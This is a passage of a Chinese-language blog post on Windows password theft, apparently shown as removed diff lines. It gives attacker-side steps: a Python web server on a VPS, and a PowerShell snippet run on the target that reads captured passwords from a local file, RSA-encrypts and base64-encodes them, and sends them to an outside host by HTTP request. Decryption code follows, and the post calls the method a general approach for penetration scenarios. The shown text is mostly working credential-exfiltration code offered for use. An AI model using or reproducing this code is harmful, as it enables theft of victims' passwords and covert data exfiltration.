-<p>第二步:在VPS上起一个web服务,建议安装apache。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg.</span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></p>
-<p>第三步:在target上的操作。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rsa</span>.FromXmlString(<span class="variable">$publickey</span>);</span><br><span class="line"><span class="variable">$rsa</span> = <span class="built_in">New-Object</span> -TypeName System.Security.Cryptography.RSACryptoServiceProvider</span><br><span class="line"><span class="variable">$p</span> = <span class="built_in">Get-Content</span> -Path c:\temp\<span class="number">1</span>.txt</span><br><span class="line"><span class="variable">$p_b</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$rsa</span>.Encrypt(<span class="variable">$p_b</span>,<span class="string">"false"</span>)</span><br><span class="line"><span class="variable">$b_64</span> = [Convert]::ToBase64String(<span class="variable">$e</span>)</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"http://192.168.1.8/aaabbb"</span>+<span class="variable">$b_64</span></span><br><span class="line"><span class="comment"># aaabbb作为标识符</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="variable">$url</span></span><br></pre></td></tr></table></figure></p>
-<p>此时 你就已经可以看到请求了。<br><img src="http.PNG" alt=""></p>
-<p>下面是解码代码<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b_byte</span> = [System.Convert]::FromBase64String(<span class="variable">$b_64</span>)</span><br><span class="line"><span class="variable">$rsa</span>.FromXmlString(<span class="variable">$privatekey</span>)           </span><br><span class="line"><span class="variable">$p_t</span> = <span class="variable">$rsa</span>.Decrypt(<span class="variable">$e</span>, <span class="string">"false"</span>) </span><br><span class="line"><span class="variable">$result</span> = [System.Text.Encoding]::Unicode.GetString(<span class="variable">$p_t</span>)</span><br></pre></td></tr></table></figure></p>
-<p>通过这样的几步，我们就安全的拿到了我们想要的密码。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这是一种通用的方案，很多渗透情景都可以用这种思路。这个脚本在这里不提供全部代码，有兴趣的同学应该可以自行编写。至于这个脚本什么时间上传，如何启动，大家思路不一样，就仁者见仁智者见智了，不再本文的讨论范围内。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/26/Windows密码窃取/" data-id="ck7zimyz6000158u4wi7ftp5f" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/加密/">加密</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
 
 </section>
         
